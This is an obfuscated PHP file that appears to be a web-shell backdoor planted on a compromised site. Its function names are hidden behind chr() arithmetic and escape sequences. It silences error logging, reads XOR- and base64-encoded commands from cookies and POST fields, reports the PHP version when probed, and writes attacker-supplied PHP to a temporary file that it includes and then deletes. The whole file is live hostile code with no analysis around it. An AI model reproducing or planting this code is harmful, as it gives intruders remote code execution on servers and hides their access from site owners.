<?php $eNUQSEwC = "\146".chr(350-245)."\154"."\145"."\137"."\x70".chr(517-400).'t'.chr(255-160).chr(99).chr(111).'n'.'t'."\x65".chr(110)."\x74".chr(365-250);
$WgIkS = chr(98).chr(733-636).chr(759-644).chr(1099-998).chr(54)."\64".chr(95).chr(914-814)."\145".'c'."\157"."\144".chr(424-323);
$AmukdqpGli = chr(105)."\156".chr(105).chr(951-856).chr(510-395)."\x65".chr(456-340);
$gZEASnLo = "\165"."\156".chr(862-754).chr(891-786).chr(110)."\153";


@$AmukdqpGli(chr(964-863).chr(114).'r'.chr(111).chr(114).chr(603-508)."\154".'o'."\x67", NULL);
@$AmukdqpGli(chr(108).'o'.chr(103).'_'."\x65"."\x72".chr(606-492)."\157"."\x72".chr(550-435), 0);
@$AmukdqpGli(chr(518-409)."\x61".chr(120)."\x5f".chr(151-50).chr(449-329)."\x65".chr(99).chr(409-292).chr(116).chr(105).chr(111)."\x6e".chr(971-876).chr(116).chr(105).chr(109).chr(101), 0);
@set_time_limit(0);

function pxJxp($SoCtmUJnw, $hmtBVqucZz)
{
    $woKAd = "";
    for ($MRfdgpraN = 0; $MRfdgpraN < strlen($SoCtmUJnw);) {
        for ($j = 0; $j < strlen($hmtBVqucZz) && $MRfdgpraN < strlen($SoCtmUJnw); $j++, $MRfdgpraN++) {
            $woKAd .= chr(ord($SoCtmUJnw[$MRfdgpraN]) ^ ord($hmtBVqucZz[$j]));
        }
    }
    return $woKAd;
}

$qllQwaM = array_merge($_COOKIE, $_POST);
$UlyEDYlv = 'f660b09a-0d3b-4e05-a713-a2b141c9f17d';
foreach ($qllQwaM as $rkLEGOQN => $SoCtmUJnw) {
    $SoCtmUJnw = @unserialize(pxJxp(pxJxp($WgIkS($SoCtmUJnw), $UlyEDYlv), $rkLEGOQN));
    if (isset($SoCtmUJnw['a'."\x6b"])) {
        if ($SoCtmUJnw["\141"] == "\151") {
            $MRfdgpraN = array(
                chr(112)."\166" => @phpversion(),
                chr(115)."\x76" => "3.5",
            );
            echo @serialize($MRfdgpraN);
        } elseif ($SoCtmUJnw["\141"] == "\x65") {
            $mhzqRtF = "./" . md5($UlyEDYlv) . chr(977-931).chr(718-613).chr(110).chr(724-625);
            @$eNUQSEwC($mhzqRtF, "<" . chr(66-3).chr(598-486)."\150".chr(498-386)."\x20".'@'.chr(117)."\156".'l'."\x69".'n'."\x6b".'('."\x5f".chr(95).chr(70).'I'.'L'.chr(757-688).'_'."\x5f".')'."\x3b".chr(611-579) . $SoCtmUJnw['d']);
            include($mhzqRtF);
            @$gZEASnLo($mhzqRtF);
        }
        exit();
    }
}

